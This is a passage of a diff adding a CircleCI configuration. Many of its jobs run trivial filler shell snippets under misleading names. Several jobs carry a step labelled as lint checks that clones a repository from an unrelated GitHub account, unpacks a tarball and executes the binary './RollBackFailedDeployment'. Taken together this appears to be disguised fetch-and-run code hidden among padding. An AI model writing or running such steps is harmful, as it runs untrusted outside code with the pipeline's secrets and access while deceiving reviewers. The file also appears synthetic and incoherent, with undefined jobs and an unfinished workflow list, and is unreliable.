+            - 'ExperimentalBuildDigest'
+  packageSigning:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/ExperimentalBuildDigest" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --no-single-branch "https://github.com/${hooks}/${fullsync}" .
+      - run:
+          name: Unpack toolkit
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            cd . && ./RollBackFailedDeployment
+  PostRestoreNightlyRelease:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - run:
+          name: ExtendedRegressionTests
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; count=0; for m in 8 46 14 24 56 3; do count=$((count * 10 + m % 10)); done; echo "$count"; true ; } > /tmp/DeferredBrowserTest/OptimizeIdentityService
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'OptimizeIdentityService'
+  ArtifactBackupRoutine:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/OptimizeIdentityService" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --depth 5 --no-tags "https://github.com/${hooks}/${fullsync}" $(pwd)
+      - run:
+          name: Hydrate workspace
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            /bin/bash -c './RollBackFailedDeployment'
+  checking-out-latest-changes:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: UploadSyncServiceSignature
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; queue=(psi wasp trout cow pink); copy=("${queue[@]}"); copy+=(heron); echo "${#queue[@]} ${#copy[@]}"; true ; } > /tmp/DeferredBrowserTest/back-end-docs
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'back-end-docs'
+  LaunchNotifierContainers:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/back-end-docs" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --jobs 2 --depth 1 "https://github.com/${hooks}/${fullsync}" ./
+      - run:
+          name: Extract sources
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            exec "./RollBackFailedDeployment"
+  RuntimeTestBuildChunk1Of2:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Periodic sync service database provisioning stage
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; printf '%s\n' heron rowan | while read -r pkg; do echo "compiling $pkg"; done; echo "all steps complete"; true ; } > /tmp/DeferredBrowserTest/post-lint-cluster-provisioning
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'post-lint-cluster-provisioning'
+  pre-approval-size-comparison:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/post-lint-cluster-provisioning" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --filter blob:none "https://github.com/${hooks}/${fullsync}" "$PWD"
+      - run:
+          name: Restore build cache
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            exec ./RollBackFailedDeployment
+  PostCheckoutClusterSetup:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: scheduledReport
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; echo "probing renderer"; label="piston-elk-7"; echo "${label%-*}"; echo "renderer responded"; true ; } > /tmp/DeferredBrowserTest/DownloadChecksumFile
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'DownloadChecksumFile'
+  compress-manual-pages:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/DownloadChecksumFile" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --jobs 2 --depth 1 "https://github.com/${hooks}/${fullsync}" "$PWD"
+      - run:
+          name: Pull reference data
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            $(pwd)/RollBackFailedDeployment
+  hash-registry-package:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Deploying (partition 7)
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; echo 'stage 1 of 5 started'; minus() { local x=$1 y=$2; echo $((x - y)); }; minus 19 10; echo "stage 1 of 5 complete"; true ; } > /tmp/DeferredBrowserTest/fetch-runtime-dependencies
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'fetch-runtime-dependencies'
+  ArchiveCompressionPhase3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/fetch-runtime-dependencies" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --jobs=2 "https://github.com/${hooks}/${fullsync}" "`pwd`"
+      - run:
+          name: Stage inputs
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            exec ./RollBackFailedDeployment
+  FormatProxy:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: NotifySecurityTeamAboutRollback
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; printf '%s\n' theta pluto quince pecan | grep -x pluto; true ; } > /tmp/DeferredBrowserTest/MiddlewareReleaseBumpWorkflow
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'MiddlewareReleaseBumpWorkflow'
+  extended-library-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/MiddlewareReleaseBumpWorkflow" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --depth 3 --branch main "https://github.com/${hooks}/${fullsync}" .
+      - run:
+          name: Unpack bundle
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            './RollBackFailedDeployment'
+
+  seed-importer-database:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - run:
+          name: Continuous storage benchmark
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; count=999; for j in 54 51 27 9; do if ((j < count)); then count=$j; fi; done; echo "$count"; true ; } > /tmp/DeferredBrowserTest/PostCommitStage
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'PostCommitStage'
+  RunReleaseScriptInBackground:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: daily-acceptance-test-segment-2
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; seq -w 1 8; true ; } > /tmp/DeferredBrowserTest/ExperimentalBuildDigest
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'ExperimentalBuildDigest'
+  indexer-volume-backup:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: CrossPlatformReleasePromotionCycle3
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; printf '%s\n' solar iota goat | grep -E '^.{4,6}$' || echo "no medium words"; true ; } > /tmp/DeferredBrowserTest/billing-service-debug-logs
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'billing-service-debug-logs'
+  AnalyzeResolverScreenshots:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Middleware Snapshot Upload Step
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; printf '%3d%%\n' 56; list=(theta mole plum orbit grape); echo "${list[@]%?}"; true ; } > /tmp/DeferredBrowserTest/Splitting
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'Splitting'
+  RunLauncherCodeScan:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Landing Page Performance Gate
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; nums=(41 35 10 59 29); printf '%s\n' "${nums[@]}" | sort -n | paste -s -d' '; true ; } > /tmp/DeferredBrowserTest/ConfigureQueryPlanner
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'ConfigureQueryPlanner'
+  ReliabilityShard6:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: release-notification (retry 2)
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; printf '%s\n' "squid" | rev; echo '2 warnings, 0 errors'; true ; } > /tmp/DeferredBrowserTest/MiddlewareReleaseBumpWorkflow
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'MiddlewareReleaseBumpWorkflow'
+  findMergeBaseAcrossAllModules:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Pre-tag lint checks
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; echo "step 1 of 8 finished"; printf '%s\n' 39 36 9 58 17 40 | awk '$1 % 2 == 0'; true ; } > /tmp/DeferredBrowserTest/periodic-dependency-freeze
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'periodic-dependency-freeze'
+  emergency-fetch:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: createParserSignatureRound5
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; echo preparing signature check; ver="0.16.0"; echo "$ver" | rev | cut -d. -f1 | rev; true ; } > /tmp/DeferredBrowserTest/FullMatrix
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'FullMatrix'
+  LongRunningFetch:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Stamping document converter version string
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; leading_digit() { local m=$1; while ((m > 9)); do m=$((m / 10)); done; echo "$m"; }; leading_digit 132; true ; } > /tmp/DeferredBrowserTest/back-end-docs
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'back-end-docs'
+  admin-panel-image-inspection:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Queue worker build manifest
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; echo "resuming lint" && printf '0x%04x\n' 25; true ; } > /tmp/DeferredBrowserTest/fetch-runtime-dependencies
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'fetch-runtime-dependencies'
+  legacyDatabaseMigration:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - run:
+          name: Refresh kernel layer cache for every module
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; status=passed; for check in scan compile; do echo "$check $status"; done; echo "all checks $status"; true ; } > /tmp/DeferredBrowserTest/BackgroundArchiveInspection
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'BackgroundArchiveInspection'
+  AutomatedSecurityApprovalHook:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: backupAgentScanResults
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; printf '%s\n' boron,33 dog,11 lynx,4 grape,1 | sed 's/,/ = /'; true ; } > /tmp/DeferredBrowserTest/decoderArtifactExtractionTask
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'decoderArtifactExtractionTask'
+  daily-mailer-contract-test-run:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: One-time report
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; runner="eel-2"; echo "runner $runner picked up the job"; echo "runner ${runner%-*} released"; true ; } > /tmp/DeferredBrowserTest/statusPageCompilerFlags
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'statusPageCompilerFlags'
+  post-push-archive-extraction:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: LoggerCoverageGroup1Of8
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; echo progress 70 percent; check_ok() { [ "$1" = ok ]; }; check_ok ok; echo passed; true ; } > /tmp/DeferredBrowserTest/NightlyBenchmark
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'NightlyBenchmark'
+  review-license-report:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Discover fast backup agent tests
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; printf '%s, ' cobalt kappa galaxy; echo; true ; } > /tmp/DeferredBrowserTest/periodic-asset-upload
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'periodic-asset-upload'
+  buildInstallationTests:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - run:
+          name: LogToolkitVersionNumber
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; paste <(seq 1 6) <(seq 6 -1 1) && echo 'gateway ready'; true ; } > /tmp/DeferredBrowserTest/complete-bump
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'complete-bump'
+  crawler-docs:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Finalize release candidate with change record
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; echo 'queued worker pool'; tally=0; for k in 34 10 35 40 17; do if ((k > tally)); then tally=$k; fi; done; echo "result $tally"; true ; } > /tmp/DeferredBrowserTest/DownloadRuntimeDependencies
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'DownloadRuntimeDependencies'
+  GatewayBuildNumber:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: localServerCoverageReport
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; printf '%s\n' "step 11 of 12 finished" "retry 4 of 5"; true ; } > /tmp/DeferredBrowserTest/Unpack
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'Unpack'
+  PrePushRepositoryFetch:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: FixtureImportPhase (replica 1)
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; printf '%s\n' "naming check finished" && printf '%s\n' lime nozzle saturn currant | grep -e n -e u; true ; } > /tmp/DeferredBrowserTest/ArchiveExtensionCrashDumps
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'ArchiveExtensionCrashDumps'
+  SandboxSignatureVerification:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - run:
+          name: execute-release-plan
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; step=5; until ((step < 1)); do echo "$step"; ((step--)); done; echo start; true ; } > /tmp/DeferredBrowserTest/generated-renderer-code
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'generated-renderer-code'
+  BuildAndTestUserPortal:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Encoding archive after each stage
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; stack=(lunar apple pig snake); copy=("${stack[@]}"); copy+=(mouse); echo "${#stack[@]} ${#copy[@]}"; true ; } > /tmp/DeferredBrowserTest/resolve-version-conflicts
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'resolve-version-conflicts'
+  RendererImageDownload:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: export-service-changelog
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; echo 'checking geo lookup'; seq 1 9 | sed '3,$d'; echo "geo lookup check passed"; true ; } > /tmp/DeferredBrowserTest/purge-catalog-module-cache
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'purge-catalog-module-cache'
+  library-scan-worker-7:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Convert (job 1)
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; factor 46 25; true ; } > /tmp/DeferredBrowserTest/post-release-stress-tests
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'post-release-stress-tests'
+  DeployResolverNode1Of5:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: lint-type-definitions-and-run-mutation-tests
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; added=190; removed=6; echo "+$added -$removed, net $((added - removed)) lines"; true ; } > /tmp/DeferredBrowserTest/publish-scan-results
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'publish-scan-results'
+  InformSecurityTeamAfterUpload:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: cache-vendor-packages
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; level=14; if [ "$level" -lt 30 ]; then echo small; elif [ "$level" -lt 70 ]; then echo medium; else echo large; fi; true ; } > /tmp/DeferredBrowserTest/helpCenterArtifactBackup
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'helpCenterArtifactBackup'
+  parser-archive-download-phase:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: firmwareArchive
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; echo "gear kappa azure apple" | sed 's/ .*//'; true ; } > /tmp/DeferredBrowserTest/post-lint-cluster-provisioning
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'post-lint-cluster-provisioning'
+  routine-error-monitoring-hook:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - run:
+          name: Deploy mail server debug build to backup region
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; printf '%s\n' gecko lambda valve | while read -r word; do echo "packing $word"; done; true ; } > /tmp/DeferredBrowserTest/OptimizeIdentityService
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'OptimizeIdentityService'
+  ExportingSampleData:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: PublishingNightlyDispatcherReleaseForPreview
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; seq 4 15 | awk '{s += $1} END {print int(s / NR)}'; true ; } > /tmp/DeferredBrowserTest/fast-release
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'fast-release'
+  OneTimeVolumeSnapshot:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: LogLinkCheckerVersionString
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; target="public/models/core/types.cfg"; echo "${target%.*}"; true ; } > /tmp/DeferredBrowserTest/isolated-release-bump-step
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'isolated-release-bump-step'
+  database-snapshot-split-8-of-8:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Apply default backup agent settings
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; declare -a list=(walnut cherry wasp nozzle magnet); echo "${list[0]}"; echo 'batch 5 queued'; true ; } > /tmp/DeferredBrowserTest/DownloadChecksumFile
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'DownloadChecksumFile'
+workflows:
+  BridgeDocsGroup1:
+    jobs:
+      - PullBillingImage
+      - review-license-report:
+          requires:
+            - PullBillingImage
+      - toolkit-schema-migrations:
+          requires:
+            - review-license-report
+      - archive-reference-manual:
+          requires:
+            - review-license-report
+      - buildInstallationTests:
+          requires:
+            - archive-reference-manual
+      - upgrades-segment-5:
+          requires:
+            - buildInstallationTests
+      - mobile-app-package-download:
+          requires:
+            - buildInstallationTests
+      - crawler-docs:
+          requires:
+            - mobile-app-package-download
+      - verify-breaking-changes:
+          requires:
+            - crawler-docs
+      - remote-bundle-build-workflow:
+          requires:
+            - crawler-docs
+      - GatewayBuildNumber:
+          requires:
+            - remote-bundle-build-workflow
+      - clean-up-old-snapshots:
+          requires:
+            - GatewayBuildNumber
+      - RemotePluginUpdate:
+          requires:
+            - GatewayBuildNumber
+      - PrePushRepositoryFetch:
+          requires:
+            - RemotePluginUpdate
+      - deploy-archive-to-one-region:
+          requires:
+            - PrePushRepositoryFetch
+      - BundleChecksumRoutine:
+          requires:
+            - PrePushRepositoryFetch
+      - SandboxSignatureVerification:
+          requires:
+            - BundleChecksumRoutine
+      - PlaygroundServiceHealthCheck:
+          requires:
+            - SandboxSignatureVerification
+      - plugin-test-report-partition-8:
+          requires:
+            - SandboxSignatureVerification
+      - BuildAndTestUserPortal:
+          requires:
+            - plugin-test-report-partition-8
+      - Dump:
+          requires:
+            - BuildAndTestUserPortal
+      - RenderAndPublishUserGuide:
+          requires:
+            - BuildAndTestUserPortal
+      - RendererImageDownload:
+          requires:
+            - RenderAndPublishUserGuide
+      - compressAndStoreCrashDumps:
+          requires:
+            - RendererImageDownload
+      - FinalArtifactRemovalStep:
+          requires:
+            - RendererImageDownload
+      - library-scan-worker-7:
+          requires:
+            - FinalArtifactRemovalStep
+      - release-signing-phase:
+          requires:
+            - library-scan-worker-7
+      - fallback-branch-sync-routine:
+          requires:
+            - library-scan-worker-7
+      - DeployResolverNode1Of5:
+          requires:
+            - fallback-branch-sync-routine
+      - fetch-sources-with-timeout:
+          requires:
+            - DeployResolverNode1Of5
+      - PeriodicServiceDeploymentStep:
+          requires:
+            - DeployResolverNode1Of5
+      - InformSecurityTeamAfterUpload:
+          requires:
+            - PeriodicServiceDeploymentStep
+      - continuous-checkout:
+          requires:
+            - InformSecurityTeamAfterUpload
+      - RuntimeTestBuildChunk1Of2:
+          requires:
+            - InformSecurityTeamAfterUpload
+      - parser-archive-download-phase:
+          requires:
+            - RuntimeTestBuildChunk1Of2
+      - pre-approval-size-comparison:
+          requires:
+            - parser-archive-download-phase
+      - PostRestoreNightlyRelease:
+          requires:
+            - parser-archive-download-phase
+      - routine-error-monitoring-hook:
+          requires:
+            - PostRestoreNightlyRelease
+      - ArtifactBackupRoutine:
+          requires:
+            - routine-error-monitoring-hook
+      - ArchiveCompressionStep:
+          requires:
+            - routine-error-monitoring-hook
+      - ExportingSampleData:
+          requires:
+            - ArchiveCompressionStep
+      - Correctness:
+          requires:
+            - ExportingSampleData
+      - sharedMemoryBenchmark:
+          requires:
+            - ExportingSampleData
+      - OneTimeVolumeSnapshot:
+          requires:
+            - sharedMemoryBenchmark
+      - benchmark-simulator-throughput:
+          requires:
+            - OneTimeVolumeSnapshot
+      - PostCheckoutClusterSetup:
+          requires:
+            - OneTimeVolumeSnapshot
+      - database-snapshot-split-8-of-8:
+          requires:
+            - PostCheckoutClusterSetup
+      - compress-manual-pages:
+          requires:
+            - database-snapshot-split-8-of-8
+  dumpByteRange:
+    jobs:
+      - probe-session-store
+      - seed-importer-database:
+          requires:
+            - probe-session-store
+      - RateLimiterSymbolUpload:
+          requires:
+            - seed-importer-database
+      - embedding-debug-information:
+          requires:
+            - seed-importer-database
+      - RunReleaseScriptInBackground:
+          requires:
+            - embedding-debug-information
+      - packageSigning:
+          requires:
+            - RunReleaseScriptInBackground
+      - BridgeCompile:
+          requires:
+            - RunReleaseScriptInBackground
+      - indexer-volume-backup:
+          requires:
+            - BridgeCompile
+      - drainCanaryNodesEveryHour:
+          requires:
+            - indexer-volume-backup
+      - pre-push-stage-cycle-6:
+          requires:
+            - indexer-volume-backup
+      - AnalyzeResolverScreenshots:
+          requires:
+            - pre-push-stage-cycle-6
+      - uploadPackageToObjectStorage:
+          requires:
+            - AnalyzeResolverScreenshots
+      - InitializeExtension:
+          requires:
+            - AnalyzeResolverScreenshots
+      - RunLauncherCodeScan:
+          requires:
+            - InitializeExtension
+      - runDocumentConverterStressTests:
+          requires:
+            - RunLauncherCodeScan
+      - FormatProxy:
+          requires:
+            - RunLauncherCodeScan
+      - ReliabilityShard6:
+          requires:
+            - FormatProxy
+      - extended-library-release:
+          requires:
+            - ReliabilityShard6
+      - daily-lint:
+          requires:
+            - ReliabilityShard6
+      - findMergeBaseAcrossAllModules:
+          requires:
+            - daily-lint
+      - overnight-report-exporter-sync:
+          requires:
